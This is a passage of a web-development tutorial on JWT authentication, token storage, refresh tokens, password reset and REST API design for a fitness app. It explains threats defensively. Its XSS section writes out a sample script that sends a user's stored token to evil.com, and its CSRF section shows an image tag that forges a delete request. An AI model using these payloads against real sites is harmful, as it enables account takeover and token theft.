Where you store your JWT token determines which attacks you're vulnerable to. There is no perfect answer — each approach trades one attack surface for another. Understanding both attacks is what lets you make an informed architectural decision.

localStorage (FitoGlobe uses this)
Simple — no server config needed
Works across tabs (persists browser session)
Not automatically sent with requests (must be explicitly added)
XSS Vulnerable: Any JavaScript on the page can read localStorage. A single XSS payload — document.cookie won't work, but localStorage.getItem('token') will. Attacker steals token, impersonates user.
XSS Mitigation: Strict Content Security Policy, sanitize all user inputs, use trusted libraries. For an auth-gated app like FitoGlobe, XSS is hard without a major vulnerability.
httpOnly Cookie
XSS Resistant: JavaScript CANNOT read httpOnly cookies. document.cookie doesn't show them. Token theft via XSS is blocked.
Browser automatically sends with every request to matching domain
Expires automatically based on cookie expiry
CSRF Vulnerable: Browser automatically includes cookies on cross-origin requests. A malicious site can trigger requests to your API using the victim's cookies.
Requires CSRF token or SameSite cookie attribute to mitigate
More complex server setup (Set-Cookie headers, CORS credentials)
CSRF Mitigation: SameSite=Strict cookie attribute — browser won't send cookie for cross-origin requests. Solves CSRF completely for same-site scenarios.

XSS vs CSRF — Understanding Both Attacks

XSS — Cross-Site Scripting
Attacker injects malicious JavaScript into your page. If successful, the script runs in the victim's browser with full access to localStorage, sessionStorage, and non-httpOnly cookies. The attack reads the JWT and sends it to the attacker's server.
// Injected script steals token
fetch('https://evil.com/steal?t=' +
localStorage.getItem('fitoglobe_token'))
Sanitize user input, Content-Security-Policy headers, use React's built-in XSS protection (don't use dangerouslySetInnerHTML)
CSRF — Cross-Site Request Forgery
Attacker tricks a logged-in user into loading a malicious page that makes authenticated requests to your API. The browser automatically includes cookies, making the request look legitimate.
// evil.com page contains:
<img src="https://fitoglobe.com/api/
user/delete" />
// Browser sends cookies automatically
SameSite=Strict cookies, CSRF tokens, verify Origin header on mutations
🏋️ FITOGLOBE'S DECISION

FitoGlobe uses localStorage + JWT for simplicity and development speed. The XSS risk is mitigated by: React's default output escaping, not using dangerouslySetInnerHTML, and the app being authentication-gated (an attacker would need to inject XSS into an already-authenticated session, which requires finding a separate vulnerability). For a production app handling financial or medical data, httpOnly cookies with SameSite=Strict would be the stronger choice.

🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Token Storage
Where should you store a JWT token in a browser and what are the security implications of each choice?
There are three main storage options, each with distinct security trade-offs. localStorage/sessionStorage: accessible via JavaScript — XSS vulnerable (any script on the page can steal the token), but immune to CSRF (must be manually added to requests, cross-origin pages can't add the Authorization header). Good for SPAs where XSS is well-mitigated. httpOnly Cookie: inaccessible to JavaScript — XSS resistant, but CSRF vulnerable without additional mitigations. Adding SameSite=Strict to the cookie attribute prevents the browser from sending the cookie on cross-origin requests, effectively defeating CSRF. In-memory (JS variable): the most secure against both XSS (not in persistent storage) and CSRF (not auto-sent), but the token is lost on page refresh — poor UX. A common best practice is to store access tokens in memory and use an httpOnly refresh token cookie for silent re-authentication on page load. FitoGlobe uses localStorage because React's built-in XSS protection and content security policy headers make XSS difficult, and the simpler localStorage approach accelerates development.
6.7

Refresh Tokens — Why They Exist

📖 FORMAL DEFINITION

A refresh token is a long-lived credential (typically 30-90 days) stored securely (in an httpOnly cookie or secure storage) that can be exchanged for new short-lived access tokens (typically 15 minutes to 7 days). This pattern allows authentication to be both secure and seamless: the short-lived access token limits the window of exposure if stolen, while the refresh token provides continuity without requiring the user to re-enter their password.

💡 HOTEL KEY CARD ANALOGY

Your room key card (access token) expires at 11pm daily — if lost, it's usable for only a few hours. At check-in, you also received a master key (refresh token) that lets you get a new room key from the front desk. The master key is more secure — kept in your safe, not your pocket. When your room key expires, you present the master key privately to the front desk (server) and receive a fresh room key. You never need to show your passport (password) again.

▸ Access Token + Refresh Token Pattern
ACCESS TOKEN
  • Short-lived: 15min — 7 days
  • Stored: localStorage or memory
  • Sent: Authorization header on every API call
  • If stolen: max 7 days exposure window
  • Cannot be revoked before expiry
REFRESH TOKEN
  • Long-lived: 30-90 days
  • Stored: httpOnly cookie (preferred)
  • Sent: only to /api/auth/refresh endpoint
  • Stored in DB → can be invalidated (logout)
  • Rotated: each use issues a new one
React
Access token expired → response interceptor catches 401 → calls /api/auth/refresh
Server
Reads refresh token from httpOnly cookie → validates against DB → issues new access token + rotates refresh token
React
Stores new access token → retries the original failed request → user notices nothing
💻 CODE EXAMPLE
backend/controllers/auth.controller.js — Refresh Token Endpoint
JS
1const refreshToken = async (req, res, next) => {
2 try {
3 // Read refresh token from httpOnly cookie (not body — can't be XSS'd)
4 const incomingRefreshToken = req.cookies.refreshToken;
5 if (!incomingRefreshToken) {
6 return res.status(401).json({ error: 'No refresh token' });
7 }
8
9 // Verify it's a valid JWT signed with REFRESH secret (different from access secret)
10 const decoded = jwt.verify(incomingRefreshToken, process.env.JWT_REFRESH_SECRET);
11
12 // Check it matches the stored hash in database (allows revocation)
13 const user = await prisma.user.findUnique({ where: { id: decoded.id } });
14 if (!user || !await bcrypt.compare(incomingRefreshToken, user.refreshTokenHash)) {
15 return res.status(401).json({ error: 'Invalid refresh token' });
16 }
17
18 // TOKEN ROTATION: generate NEW refresh token, invalidate old one
19 // If old token is used again after rotation → detect token reuse attack
20 const newRefreshToken = jwt.sign({ id: user.id }, process.env.JWT_REFRESH_SECRET, { expiresIn: '30d' });
21 await prisma.user.update({ where: { id: user.id }, data: { refreshTokenHash: await bcrypt.hash(newRefreshToken, 10) } });
22
23 // Issue new access token + send new refresh token in httpOnly cookie
24 res.cookie('refreshToken', newRefreshToken, {
25 httpOnly: true, // Not accessible by JavaScript
26 secure: true, // HTTPS only
27 sameSite: 'strict', // CSRF protection
28 maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days in ms
29 });
30 const accessToken = generateToken(user.id);
31 res.json({ accessToken });
32 } catch (err) { next(err); }
33};
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Refresh Tokens
If JWTs can't be revoked before they expire, how do you implement "logout everywhere" functionality?
Standard JWTs are stateless — the server has no record of issued tokens, so it cannot "un-issue" one. A token is valid until its expiry, even if the user has logged out. For most applications, using short-lived access tokens (15 minutes to 1 hour) makes this acceptable — a stolen token is usable only briefly. For "logout everywhere" or immediate session revocation (e.g., user detects account compromise), there are three approaches: (1) Token blocklist: maintain a database or Redis set of revoked token IDs (the JWT's jti claim). Every protect middleware call checks this set. Adds one DB/Redis lookup per request. (2) Refresh token revocation: the short-lived access token (15min) isn't worth revoking. Instead, revoke the refresh token in the database. Within 15 minutes, the access token expires and cannot be renewed. (3) Token version counter: store a tokenVersion field on the user record, include it in the JWT. When revoking, increment the counter. Middleware rejects tokens whose version doesn't match the current version. FitoGlobe's practical approach: short-lived access tokens + revocable refresh tokens stored in the database, giving effective logout within the access token's lifespan.
6.8

Google OAuth 2.0 — Security Deep Dive

ℹ️ COVERED IN PART 4 — Extended Security Focus Here

The step-by-step OAuth flow was covered in Part 4 (section 4.9). This section focuses on the security aspects: state parameter, PKCE, and what to do after receiving the Google profile.

📖 THE OAUTH STATE PARAMETER — CSRF Prevention

When FitoGlobe redirects to Google for OAuth, it includes a state parameter — a random, one-time string generated and stored server-side. Google includes this state in the callback URL. The server verifies the state matches before processing the callback. This prevents CSRF attacks where a malicious site could trick a user into completing an OAuth flow that connects their account to the attacker's session.

Google OAuth Callback — What to do after receiving the profile
JS
1// backend/routes/auth.routes.js
2
3// Step 1: Redirect user to Google's consent screen
4router.get('/google', passport.authenticate('google', {
5 scope: ['profile', 'email']
6}));
7
8// Step 2: Google redirects back with code → Passport exchanges for profile
9router.get('/google/callback',
10 passport.authenticate('google', { session: false, failureRedirect: '/login?error=oauth' }),
11 async (req, res) => {
12 // req.user was set by Passport's verify callback (upsert in db)
13 const accessToken = generateToken(req.user.id);
14
15 // ✅ SECURITY: Don't put token in URL hash (browser history, referer headers)
16 // Instead: short-lived one-time code → React exchanges it for the real token
17 // OR use httpOnly cookie (set here, read on frontend silently)
18 res.cookie('oauth_token', accessToken, {
19 httpOnly: false, // React needs to read this once to store it
20 maxAge: 60000, // 60 seconds — one-time use
21 secure: true
22 });
23 // Redirect to React app — React reads cookie, stores token, deletes cookie
24 res.redirect(`${process.env.FRONTEND_URL}/auth/callback`);
25 }
26);
6.9

Session-Based vs Token-Based Authentication

📖 FORMAL DEFINITION

Session-based authentication (stateful) stores authentication state on the server — when a user logs in, the server creates a session record in a database or memory, generates a session ID, and sends it to the client via cookie. Every request requires the server to look up the session ID to verify identity. Token-based authentication (stateless) encodes the authentication state inside the token itself (JWT) — no server-side storage is needed for verification; any server with the secret can verify any token.

AspectSession-BasedToken-Based (JWT) — FitoGlobe
Server stateStateful — sessions stored in DB/RedisStateless — verification is pure computation
Horizontal scalingRequires shared session store (Redis)Any server verifies — no shared state needed
RevocationInstant — delete session from storeMust wait for token expiry (or use blocklist)
Database lookup per requestYes — one lookup per requestNo — token is self-contained
Token size in requestsSmall (session ID, ~36 chars)Larger (JWT, ~200-500 chars)
Mobile/API clientsCookies are awkward for mobileBearer tokens work everywhere
Best forMonolith web apps, user content sitesAPIs, SPAs, microservices, mobile backends
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Session vs Token
Why does FitoGlobe use JWT instead of traditional sessions?
FitoGlobe chose JWTs for three concrete reasons. First, stateless architecture: FitoGlobe's React frontend and Express backend are deployed separately on different platforms (Vercel + Railway). JWT verification requires only the JWT_SECRET — no shared session database between server instances. If Railway adds more Express instances for load, each can verify tokens independently. Sessions would require a shared Redis instance accessible by all backend instances. Second, API-first design: the Express backend is a pure REST API serving JSON, not a traditional web server rendering HTML. Bearer token authentication (JWT in Authorization header) is the REST API standard — it works for React web, React Native mobile, Postman testing, and third-party integrations without any changes. Third, mobile readiness: if FitoGlobe adds a React Native app (a planned feature), JWT tokens work perfectly. Cookie-based sessions require additional CORS configuration and behave inconsistently across mobile platforms. The trade-off accepted is that active JWTs cannot be instantly revoked — mitigated by using shorter expiry times and the refresh token pattern.
6.10

Common Auth Attacks & How to Prevent Them

Brute Force Attack
Attacker systematically tries all possible passwords against a known email address. At 1,000 attempts/second, an 8-char lowercase password is crackable in hours. bcrypt alone (250ms/attempt) reduces this to 4/second, but dedicated hardware can parallelize.
Rate limiting (5 attempts/IP/15min), account lockout after N failures, CAPTCHA after repeated failures, bcrypt cost 12+, minimum password length enforcement
Credential Stuffing
Attackers buy/download databases of leaked username:password pairs from other sites and test them against FitoGlobe. Works because users reuse passwords. A 2024 database breach of Site X instantly gives attackers millions of credential pairs to try on FitoGlobe.
Rate limiting by IP + User-Agent + device fingerprint, anomalous login detection (new location, new device), multi-factor authentication, "Have I Been Pwned" API integration
JWT Algorithm Confusion
A historic attack: some JWT libraries with alg: "none" accepted unsigned tokens. Or: changing alg from RS256 to HS256 and signing with the public key (which the attacker knows). Forged tokens pass verification.
Always explicitly specify the expected algorithm in jwt.verify(): jwt.verify(token, secret, {algorithms: ['HS256']}). Never trust the algorithm in the token header.
Password Reset Poisoning
Attacker intercepts a password reset and uses the token themselves. Or: a predictable reset token (using Math.random() — not cryptographically secure) is guessed. Or: the reset token doesn't expire, allowing replay attacks after months.
Use crypto.randomBytes(32).toString('hex') for tokens, store only the hash in DB, short expiry (1 hour), single-use (delete after use), rate limit reset requests
Insecure Direct Object Reference (IDOR)
User changes the workout ID in the URL: from /api/workouts/their-id to /api/workouts/victim-id. If the controller doesn't check ownership, they access another user's private data. One of the most common API vulnerabilities.
ALWAYS check ownership in controllers: if (workout.userId !== req.user.id) return 403. Ownership check is authorization — never skip it just because the user is authenticated.
Timing Attacks on Token Comparison
Comparing tokens or hashes with standard === short-circuits on first mismatch. By measuring response times with microsecond precision, attackers can determine characters of the correct token one by one.
Use constant-time comparison functions: crypto.timingSafeEqual() for reset tokens, bcrypt.compare() for passwords. Never use === for secret comparison.
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Auth Attacks
What is an IDOR vulnerability and how do you prevent it in FitoGlobe?
IDOR (Insecure Direct Object Reference) occurs when an application uses user-supplied input to access objects without verifying that the user has permission to access that specific object. In FitoGlobe, every workout has a unique ID. If the getWorkoutById controller simply does prisma.workout.findUnique({where: {id: req.params.id}}) without checking ownership, a logged-in user can access ANY workout by changing the ID in the URL — another user's private fitness data. The prevention is always performing an authorization check after the resource is found: verify that workout.userId === req.user.id before returning data or allowing mutations. This is the authorization step (not just authentication). IDOR is consistently in OWASP's Top 10 API vulnerabilities because many developers protect routes with authentication (JWT) but forget the authorization check (ownership). A properly authenticated request with a valid token is still unauthorized to access resources that don't belong to that user.
6.11

Password Reset Flow — Secure Implementation

📖 THE SECURE PASSWORD RESET PATTERN

A secure password reset flow uses a cryptographically random, hashed, expiring, single-use token delivered via email to a verified address. The token itself is never stored in plain text — only its hash is stored in the database, so a database breach doesn't allow attackers to use stolen reset tokens.

  1. 1
    User submits email to POST /api/auth/forgot-password Always return the same success message regardless of whether the email exists: "If that email is registered, you'll receive a reset link." This prevents account enumeration — attackers can't test which emails are registered.
  2. 2
    Server generates cryptographically random token const rawToken = crypto.randomBytes(32).toString('hex') — 256 bits of entropy, virtually impossible to guess. NOT Math.random() which is predictable.
  3. 3
    Hash the token and store in database const tokenHash = crypto.createHash('sha256').update(rawToken).digest('hex'). Store the HASH in the DB (not the raw token), with an expiry of 1 hour. This way, a DB breach doesn't give attackers valid reset tokens.
  4. 4
    Send email with raw token in URL The email link contains the RAW token: https://fitoglobe.com/reset-password?token=abc123raw.... The user's email client is the only place the raw token ever appears.
  5. 5
    User clicks link, submits new password to POST /api/auth/reset-password Server receives the raw token from the URL. It hashes it with SHA-256 and queries: prisma.user.findFirst({where: {resetToken: hash, resetTokenExp: {gte: new Date()}}}).
  6. 6
    Verify token and update password If found and not expired: hash the new password with bcrypt, update the user's password, and delete the reset token (single-use). Issue a new JWT and log the user in automatically.
backend/controllers/auth.controller.js — Secure Password Reset
JS
1const crypto = require('crypto'); // Node.js built-in crypto module
2
3const forgotPassword = async (req, res, next) => {
4 const { email } = req.body;
5 const user = await prisma.user.findUnique({ where: { email } });
6
7 // ✅ SECURITY: Always return same message — prevent account enumeration
8 // Process the token regardless, to prevent timing-based enumeration too
9 if (!user) return res.json({ message: 'If that email exists, a reset link was sent' });
10
11 // crypto.randomBytes: OS-level CSPRNG — NOT Math.random()
12 const rawToken = crypto.randomBytes(32).toString('hex');
13 // → "a3f2b1c8d9e0..." — 64 hex characters = 256 bits of entropy
14
15 // Hash before storing — DB breach can't be used to reset passwords
16 const tokenHash = crypto.createHash('sha256').update(rawToken).digest('hex');
17
18 await prisma.user.update({
19 where: { id: user.id },
20 data: {
21 resetToken: tokenHash, // Store HASH (not raw token)
22 resetTokenExp: new Date(Date.now() + 3600000) // Expires in 1 hour
23 }
24 });
25
26 // Email contains rawToken — only ever in transit, never stored plain
27 await emailService.sendPasswordResetEmail({ to: email, resetToken: rawToken, userName: user.name });
28 res.json({ message: 'If that email exists, a reset link was sent' });
29};
30
31const resetPassword = async (req, res, next) => {
32 const { token, newPassword } = req.body; // rawToken from email URL
33
34 // Hash the received raw token and look it up in DB
35 const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
36 const user = await prisma.user.findFirst({
37 where: {
38 resetToken: tokenHash, // Match hashed token
39 resetTokenExp: { gte: new Date() } // Not expired
40 }
41 });
42
43 if (!user) return res.status(400).json({ error: 'Invalid or expired token' });
44
45 await prisma.user.update({
46 where: { id: user.id },
47 data: {
48 password: await bcrypt.hash(newPassword, 12), // Hash new password
49 resetToken: null, // Delete token — single use
50 resetTokenExp: null // Clear expiry
51 }
52 });
53 res.json({ message: 'Password reset successful' });
54};
❌ COMMON MISTAKES
  • Using Math.random() to generate reset tokens

    JavaScript's Math.random() is a pseudo-random number generator seeded with predictable values — it's designed for statistics, not security. A sophisticated attacker who knows the approximate time of the reset request can predict the output space and guess the token. This has been exploited in real applications.

    Fix

    Always use crypto.randomBytes(32) — it draws from the operating system's Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), which is unpredictable even with knowledge of the seed.

  • Storing reset tokens in plain text

    If your database is breached, attackers can immediately use plain-text reset tokens to take over every account that has a pending reset. Since tokens are short-lived (1 hour), an attacker during an active breach might exploit them before the TTL expires.

    Fix

    Store only the SHA-256 hash of the token. The raw token goes only in the email (in transit, not at rest). On verification, hash the received token and compare to the stored hash.

  • Not invalidating the token after use (multi-use reset tokens)

    If the reset token is not deleted after the password is changed, it can be used multiple times — an attacker who intercepts the reset email link even hours later can reset the password again.

    Fix

    Always set resetToken: null, resetTokenExp: null in the same database update that sets the new password. This is idempotent with the transaction pattern.

🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Password Reset
Why should the forgot password endpoint return the same message whether the email exists or not?
This is the principle of preventing account enumeration. If the endpoint returns "Email not found" for unregistered emails and "Reset link sent" for registered ones, an attacker can systematically test millions of email addresses to build a list of valid FitoGlobe accounts. This list has value: it can be used for targeted phishing ("Hi Ayush, your FitoGlobe account has been compromised"), credential stuffing attacks, and spam campaigns. By returning the identical response ("If that email is registered, you'll receive a link") for both cases, the endpoint leaks no information about whether any given email has an account. The same principle applies to login error messages — "Invalid email or password" rather than "Email not found" or "Wrong password" — for the same reason. It also applies to timing: if the "email found" path takes 300ms (bcrypt hashing) and the "email not found" path returns immediately, an attacker can tell them apart by measuring response time. The fix is to always call bcrypt with a dummy hash when the email isn't found, so both paths take similar time.
✓ PART 6 COMPLETE
Authentication Deep Dive Complete

You now understand authentication from first principles — bcrypt's salt and cost factor, JWT's cryptographic signature, every attack vector and its countermeasure, and the complete password reset flow.

AuthN vs AuthZ ✓ bcrypt Internals ✓ JWT h.p.s ✓ Token Storage ✓ XSS & CSRF ✓ Refresh Tokens ✓ OAuth 2.0 ✓ Attack Patterns ✓ Password Reset ✓
MERGE INSTRUCTION: Copy <div class="content-area"> contents and paste after Part 5's last </section> in the master file.
PART 07 / 13

APIs — Comprehensive

An API is the contract between your frontend and backend. Understanding REST principles, naming conventions, error shapes, pagination strategies, and rate-limiting algorithms is what separates junior developers from engineers who build APIs others love to consume.

REST Principles API Design All Endpoints Request-Response Versioning Pagination Rate Limiting Webhooks
7.1

What Is an API?

📖 FORMAL DEFINITION

An API (Application Programming Interface) is a defined set of rules, protocols, and tools that specifies how software components should interact. It acts as a contract between a provider (the server that exposes functionality) and a consumer (the client that uses it), abstracting away implementation details. In web development, an API typically refers to an HTTP-based interface where clients send structured requests and receive structured responses — most commonly JSON — without needing to know how the server processes them internally.

💡 ELECTRICAL OUTLET ANALOGY

An API is like an electrical outlet in your wall. You don't need to know how the power grid, transformers, and wiring work — you just plug in your device (the client) using the standardized interface (the socket). The outlet exposes a contract: "Insert a standard plug here, and you'll get 230V AC power." FitoGlobe's API is the same: "Send a POST to /api/workouts with this JSON body and a JWT token, and you'll get back a workout object." The client doesn't know whether PostgreSQL or MongoDB is running behind it.

API Types — REST vs GraphQL vs gRPC vs WebSocket

TypeProtocolData FormatBest ForFitoGlobe Uses?
REST HTTP/HTTPS JSON Standard CRUD APIs, web/mobile backends, public APIs ✓ Main API
GraphQL HTTP/HTTPS JSON Flexible queries where client decides shape of response, reduces over-fetching Not used
gRPC HTTP/2 Protocol Buffers (binary) High-performance inter-service communication, microservices Not used
WebSocket WS/WSS JSON / Binary Real-time bidirectional: chat, live notifications, live workout tracking Future feature
Groq API HTTP/HTTPS JSON + SSE streams AI inference, language model completions ✓ AI features
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — What Is an API
What is the difference between REST and GraphQL? When would you choose each?
REST exposes multiple endpoints, each returning a fixed data shape — GET /api/workouts always returns an array of workout objects with all their fields. GraphQL exposes a single endpoint (/graphql) and lets the client specify exactly which fields it needs using a query language. If the workout list only needs names and dates (not all 10 fields), a GraphQL query fetches exactly those — reducing over-fetching. GraphQL is also powerful for under-fetching: fetching a user, their workouts, and each workout's exercises would be 3 REST requests but one GraphQL query with nested selections. Choose REST when: the API is simple CRUD, you have a small team, caching is important (GraphQL's single endpoint makes HTTP caching harder), or you're building a public API that third parties will consume (REST is more universally understood). Choose GraphQL when: multiple client types (web, mobile, TV) need different data shapes, the data graph is highly relational, or you want to eliminate the round-trip coordination between frontend and backend developers arguing about what the endpoint should return.
7.2

REST Principles — The 6 Constraints

📖 FORMAL DEFINITION

REST (Representational State Transfer) is an architectural style defined by Roy Fielding in his 2000 doctoral dissertation. It is not a protocol or a standard — it is a set of six architectural constraints. An API that follows all six constraints is called RESTful. Most "REST APIs" in production (including FitoGlobe's) follow the most important constraints but may not be fully pure REST — which is perfectly acceptable in practice.

1. CLIENT–SERVER
The client and server are separate concerns. The client handles UI, the server handles data. They communicate only via the API.
✓ React on Vercel ↔ Express on Railway
2. STATELESS
Every request must contain all information needed to process it. The server keeps no client session state between requests.
✓ JWT in every request header
3. CACHEABLE
Responses must indicate whether they are cacheable. Clients and CDNs can cache eligible responses to reduce load.
✓ Cache-Control headers on GET responses
4. UNIFORM INTERFACE
The most important constraint. Resources identified by URIs, manipulated through representations, self-descriptive messages, HATEOAS.
✓ /api/workouts/:id with standard HTTP verbs
5. LAYERED SYSTEM
Client cannot tell if it's connected directly to the server or through intermediaries (load balancers, CDNs, API gateways).
✓ Cloudflare CDN in front of Vercel
6. CODE ON DEMAND (optional)
Server can extend client functionality by sending executable code (JavaScript). The only optional constraint.
✓ Vercel serving React bundle JS files
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — REST Principles
What does "stateless" mean in REST and why is it important for scalability?
A stateless server retains no memory of previous client interactions. Every HTTP request must be self-contained — carrying all the information the server needs to process it, including authentication credentials (JWT token), the specific resource being accessed (URL), and the action to perform (HTTP method + body). The server processes each request in isolation, then forgets the client entirely. This is critical for horizontal scalability: if FitoGlobe's backend needs to handle 10x more traffic, Railway can simply run 10 identical Express instances behind a load balancer. Since no client session state is stored on the server, any instance can handle any request — there's no "sticky session" requirement. With stateful session-based authentication, a user who logged in to Server A would be rejected by Server B (which doesn't have their session). With JWT-based stateless auth, any server with the JWT_SECRET can verify any token, enabling true horizontal scaling without a shared session store.
What is HATEOAS and is it actually used in practice?
HATEOAS (Hypermedia As The Engine Of Application State) is part of REST's Uniform Interface constraint. A truly RESTful API response includes not just data but also links to related actions the client can take next — the server drives the application state machine. For example, a workout response might include "_links": {"self": "/api/workouts/123", "delete": "/api/workouts/123", "exercises": "/api/workouts/123/exercises"}. The client discovers available operations dynamically from the response rather than hardcoding URLs. In practice, HATEOAS is rarely implemented in modern REST APIs. The vast majority of production APIs (including all major ones: GitHub, Stripe, Twitter) are "REST-like" or "REST-inspired" rather than pure REST — they use URIs, HTTP methods, and JSON but don't implement HATEOAS. The benefits (client decoupling from URL structure) are outweighed by the implementation complexity and the fact that frontend developers typically read API documentation rather than discovering routes dynamically. FitoGlobe does not implement HATEOAS — it is a pragmatic REST API, not a purist one.
7.3

REST API Design Best Practices

ℹ️ GOOD DESIGN IS A FORCE MULTIPLIER

A well-designed API is self-documenting — developers can guess the endpoint for getting a user's workouts without reading docs. A poorly designed API creates daily frustration, inconsistency, and bugs. These rules apply to FitoGlobe's API and to every API you'll work with professionally.

Naming Conventions — URLs That Make Sense

Rule❌ Wrong✓ Correct (FitoGlobe)Why
Use nouns, not verbs /getWorkouts
/createWorkout		 /workouts
/workouts (POST)		 HTTP method IS the verb. The URL describes the resource.
Use plurals consistently /workout
/user		 /workouts
/users		 Collections are plural. Consistent with database table naming.
Use lowercase + hyphens /dietEntries
/DietEntry		 /diet-entries URLs are case-sensitive on most servers. Hyphens are more readable than underscores in URLs.
Nest resources logically /getExercisesForWorkout?id=123 /workouts/123/exercises Nested URL shows the relationship — exercises belong to a workout.
Use query params for filtering /workouts/chest /workouts?type=chest&from=2024-01-01 Path params identify resources, query params filter/sort/paginate collections.
Version at the path prefix /workouts (unversioned) /api/v1/workouts Allows breaking changes in v2 while v1 clients keep working.

Response Shape Consistency

Every FitoGlobe API response follows the same envelope structure. Consistency lets the React frontend handle responses predictably without per-endpoint special cases.

Consistent API Response Envelopes — Success and Error
JSON
1// ✅ SUCCESS RESPONSE — collection (GET /api/workouts)
2{
3 "success": true,
4 "data": [ // Always in a "data" key — never at root level
5 { "id": "clx...", "name": "Chest Day", "duration": 60 },
6 { "id": "cly...", "name": "Leg Day", "duration": 75 }
7 ],
8 "count": 2, // Items in this page
9 "total": 47, // Total matching records (for pagination UI)
10 "page": 1,
11 "hasMore": true
12}
13
14// ✅ SUCCESS RESPONSE — single resource (GET /api/workouts/:id)
15{
16 "success": true,
17 "data": { "id": "clx...", "name": "Chest Day", "exercises": [...] }
18}
19
20// ✅ SUCCESS RESPONSE — creation (POST /api/workouts) — 201 Created
21{
22 "success": true,
23 "data": { "id": "clz...", "name": "New Workout", ... } // Return created resource
24}
25
26// ✅ ERROR RESPONSE — validation failure (400)
27{
28 "success": false,
29 "error": "Validation failed", // Human-readable message
30 "errors": [ // Field-level details
31 { "field": "name", "message": "Name is required" },
32 { "field": "duration", "message": "Must be between 1 and 600 minutes" }
33 ],
34 "statusCode": 400
35}
36
37// ✅ ERROR RESPONSE — server error (500)
38{
39 "success": false,
40 "error": "Internal server error" // Generic — no stack trace, no internals
41}
❌ COMMON MISTAKES
  • Returning 200 OK for errors

    Returning { "status": "error", "message": "Not found" } with HTTP status 200 breaks every HTTP client, monitoring tool, and load balancer that uses status codes to detect failures. Axios won't trigger .catch(), your response interceptor won't catch 401s, and Postman will show green.

    Fix

    Always use appropriate HTTP status codes. Errors → 4xx/5xx. The HTTP status code IS the primary error signal — the JSON body provides additional details.

  • Inconsistent response shapes between endpoints

    Returning { workouts: [...] } from one endpoint and { data: [...] } from another forces frontend developers to handle each endpoint differently — multiplying complexity and potential bugs.

    Fix

    Establish and enforce a single response envelope. FitoGlobe always uses { success: bool, data: ... }. Document it in your README. Your error handler middleware enforces the error shape.

  • Exposing internal database IDs or implementation details

    Returning raw Prisma errors, database column names, or internal field names in API responses leaks implementation details and makes migrations harder (changing a column name breaks the API contract).

    Fix

    Use the select option in Prisma to control exactly which fields are returned. Map internal names to public API names if they differ.

🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — API Design
What is the difference between a path parameter and a query parameter? When should you use each?
Path parameters (e.g., /api/workouts/:id) are part of the URL path and identify a specific resource. They are mandatory — a URL without them points to a different resource or no resource. Use path parameters when you're identifying a specific item: a particular workout (/workouts/clx8k2abc), a user (/users/user-123), or a sub-resource (/workouts/clx8k2abc/exercises). Query parameters (e.g., /api/workouts?type=strength&from=2024-01-01&limit=20) appear after the ? and modify how a collection is returned. They are optional modifiers — the URL /api/workouts is valid without them, returning all workouts. Use query parameters for: filtering (by type, date, status), sorting (by date, duration), pagination (page, limit, skip), searching (q=chest), and format options (format=csv). A useful mental model: path params = "which resource?", query params = "how should I filter/sort/shape it?" Mixing them up is a common API design mistake — /api/workouts/strength implies "strength" is a workout ID, not a type filter, and will confuse consumers.
7.4

FitoGlobe Complete Endpoint Reference

🏋️ COMPLETE API CONTRACT

This is every HTTP endpoint FitoGlobe's Express backend exposes — the full contract between the React frontend and the server. Base URL in production: https://fitoglobe-api.railway.app. In development, Vite proxies /api to localhost:5000.

🔐 Authentication Endpoints (Public — no token required)

MethodPathAuthRequest BodySuccess Response
POST /api/auth/register PUBLIC { email, password, name } 201 { user, token }
POST /api/auth/login PUBLIC { email, password } 200 { user, token }
POST /api/auth/refresh COOKIE — (refreshToken in cookie) 200 { accessToken }
POST /api/auth/logout PRIVATE — 204 No Content
POST /api/auth/forgot-password PUBLIC { email } 200 { message }
POST /api/auth/reset-password PUBLIC { token, newPassword } 200 { message }
GET /api/auth/google PUBLIC — (redirects to Google) 302 Redirect
GET /api/auth/google/callback OAUTH — (Google provides code) 302 → Frontend + cookie
GET /api/auth/me PRIVATE — 200 { user }

💪 Workout Endpoints (All Private)

MethodPathQuery ParamsRequest BodySuccess Response
GET /api/workouts ?skip=0&take=20&type=strength&from=date&to=date&sort=newest — 200 { data:[], count, total, hasMore }
GET /api/workouts/:id — — 200 { data: workout+exercises }
POST /api/workouts — { name, duration, exercises[], notes? } 201 { data: created workout }
PATCH /api/workouts/:id — { name?, duration?, notes? } (any subset) 200 { data: updated workout }
DELETE /api/workouts/:id — — 204 No Content
GET /api/workouts/stats ?period=week|month|year — 200 { totalWorkouts, totalMinutes, avgDuration }

🥗 Diet Endpoints | 📈 Progress | 👤 User | 🤖 AI

MethodPathAuthBody / Response
GET/api/dietPRIVATE?date=2024-01-15 → 200 { data: entries[], dailyTotals }
POST/api/dietPRIVATE{ mealType, calories, protein, carbs, fat, notes? } → 201 { data }
DELETE/api/diet/:idPRIVATE— → 204
GET/api/progressPRIVATE?from=date&to=date → 200 { data: logs[] }
POST/api/progressPRIVATE{ weight?, bodyFat?, notes?, photos?[] } → 201 { data }
GET/api/user/profilePRIVATE— → 200 { user } (no password)
PATCH/api/user/profilePRIVATE{ name?, weight?, height?, goal? } → 200 { user }
DELETE/api/user/accountPRIVATE{ password } (confirm) → 204
POST/api/ai/chatPRIVATE{ message, history?[] } → 200 { reply, suggestedWorkout? }
POST/api/ai/recommendPRIVATE{ goal, fitnessLevel, equipment } → 200 { workout plan }
POST/api/ai/macrosPRIVATE{ goal, weight, activityLevel } → 200 { dailyCalories, macros }
GET/healthPUBLIC— → 200 { status: "ok", timestamp }
7.5

Complete Request–Response Cycle

📖 FORMAL DEFINITION

The request–response cycle is the complete sequence of events from a user action in the browser to the final UI update — traversing the React component tree, the network, the Express middleware chain, the database, and back. Understanding every step eliminates the guesswork from debugging: when something breaks, you can pinpoint exactly which layer failed.

Let's trace a user clicking "Save Workout" in FitoGlobe through every single step:

  1. 1
